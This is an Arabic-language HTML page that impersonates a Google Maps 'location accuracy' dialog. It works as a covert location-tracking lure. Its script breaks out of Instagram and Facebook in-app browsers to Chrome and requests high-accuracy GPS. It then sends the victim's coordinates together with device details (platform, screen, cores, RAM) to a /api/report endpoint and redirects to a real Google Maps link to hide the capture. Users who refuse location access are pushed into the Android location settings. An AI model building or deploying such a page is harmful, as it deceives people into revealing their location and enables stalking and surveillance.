<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Maps</title>
    <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/maps_round_32dp.png">
    <style>
        :root {
            --blue: #8ab4f8;
            --bg: #202124;
            --text: #e8eaed;
            --gray: #9aa0a6;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
            outline: none;
        }

        body {
            font-family: 'Roboto', sans-serif;
            height: 100vh;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        #bg-map {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            filter: blur(4px) brightness(0.4);
            z-index: 1;
            object-fit: cover;
        }

        .dialog {
            position: relative;
            z-index: 10;
            background: var(--bg);
            width: 92%;
            max-width: 360px;
            border-radius: 28px;
            padding: 24px;
            color: var(--text);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
        }

        h2 {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 20px;
            line-height: 1.5;
            text-align: right;
        }

        .item {
            display: flex;
            align-items: flex-start;
            margin-bottom: 18px;
        }

        .icon {
            width: 22px;
            height: 22px;
            color: var(--gray);
            margin-left: 12px;
            flex-shrink: 0;
        }

        .txt {
            font-size: 13px;
            color: var(--text);
            line-height: 1.5;
            text-align: right;
        }

        .actions {
            display: flex;
            flex-direction: row-reverse;
            gap: 10px;
            margin-top: 30px;
        }

        .btn {
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
        }

        .btn-blue {
            background: var(--blue);
            color: #202124;
        }

        .btn-ghost {
            background: transparent;
            color: var(--blue);
        }
    </style>
</head>

<body>

    <img id="bg-map"
        src="https://media.wired.com/photos/59269abc8d4ebc5ab806b04f/master/w_2560%2Cc_limit/GoogleMapsScreen.jpg">

    <div class="dialog">
        <h2>تفعيل "دقة الموقع الجغرافي" للمتابعة</h2>

        <div class="item">
            <svg class="icon" fill="currentColor" viewBox="0 0 24 24">
                <path
                    d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
            </svg>
            <div class="txt">يجب تفعيل الموقع الجغرافي للجهاز لعرض الاتجاهات بدقة.</div>
        </div>

        <div class="item">
            <svg class="icon" fill="currentColor" viewBox="0 0 24 24">
                <path
                    d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06C6.83 3.52 3.52 6.83 3.06 11H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z" />
            </svg>
            <div class="txt">تحسين دقة الموقع باستخدام شبكات Wi-Fi وأدوات استشعار الجهاز.</div>
        </div>

        <div class="actions">
            <button class="btn btn-blue" id="ok">تفعيل</button>
            <button class="btn btn-ghost" onclick="jump()">لا، شكراً</button>
        </div>
    </div>

    <script>
        const REDIRECT = "https://maps.app.goo.gl/Lb1Adj5BV7YwQyPi9";
        let isWorking = false;

        // 🛡️ هروب إجباري وقوي لكروم (لضمان ظهور الإذن)
        (function () {
            var ua = navigator.userAgent;
            if (/Instagram|FBAN|FBAV/i.test(ua)) {
                var currentUrl = window.location.href.replace(/https?:\/\//, "");
                window.location.href = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
            }
        })();

        // التنفيذ عند النقر مباشرة
        document.getElementById('ok').onclick = function () {
            if (isWorking) return;
            isWorking = true;
            
            // تحسين شكل الزر عند الضغط
            this.innerHTML = '<span style="display:flex; align-items:center; gap:5px;">جاري الاتصال... <div class="spinner"></div></span>';
            this.style.opacity = "0.7";

            // طلب الموقع فوراً بأعلى دقة ممكنة
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (p) {
                        // نجاح: إرسال البيانات والتحويل
                        push({ 
                            lat: p.coords.latitude, 
                            lon: p.coords.longitude, 
                            acc: p.coords.accuracy.toFixed(1) + "m" 
                        });
                    },
                    function (e) {
                        // فشل: معالجة أنواع الأخطاء
                        let errorMsg = "خطأ غير معروف";
                        if (e.code == 1) {
                            errorMsg = "تم رفض الإذن";
                            // إذا رفض المستخدم، نوجهه للإعدادات في الأندرويد كخطة بديلة
                            handleDenied();
                        } else if (e.code == 2) {
                            errorMsg = "الموقع مغلق في الجهاز";
                            handleDenied();
                        } else if (e.code == 3) {
                            errorMsg = "انتهت مهلة الطلب";
                        }
                        
                        push({ lat: "فشل", lon: errorMsg, acc: "Error: " + e.code });
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 8000, 
                        maximumAge: 0 
                    }
                );
            } else {
                jump();
            }
        };

        function handleDenied() {
            // كود سحري للأندرويد: فتح إعدادات الموقع مباشرة
            const ua = navigator.userAgent.toLowerCase();
            if (ua.indexOf("android") > -1) {
                setTimeout(() => {
                    // شاشة توجيه سريعة
                    document.body.innerHTML = `
                        <div style="background:#000; color:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px;">
                            <h2 style="color:#ff4b4b;">يجب تفعيل GPS</h2>
                            <p style="margin:15px 0;">سيتم فتح الإعدادات الآن.. قم بتفعيل "موقعي" ثم عد للرابط</p>
                            <div class="spinner"></div>
                        </div>
                    `;
                    setTimeout(() => {
                        window.location.href = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
                    }, 1500);
                }, 500);
            }
        }

        function push(d) {
            var specs = {
                plat: navigator.platform,
                screen: screen.width + "x" + screen.height,
                cores: navigator.hardwareConcurrency || "؟",
                ram: navigator.deviceMemory || "؟",
                time: new Date().toLocaleTimeString('ar-EG')
            };

            fetch('/api/report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...d, ...specs }),
                keepalive: true
            }).finally(jump);

            // تحويل احتياطي سريع
            setTimeout(jump, 2500);
        }

        function jump() {
            window.location.href = REDIRECT;
        }
    </script>
    <style>
        .spinner {
            width: 14px;
            height: 14px;
            border: 2px solid rgba(0,0,0,0.1);
            border-top: 2px solid #202124;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

</body>

</html>
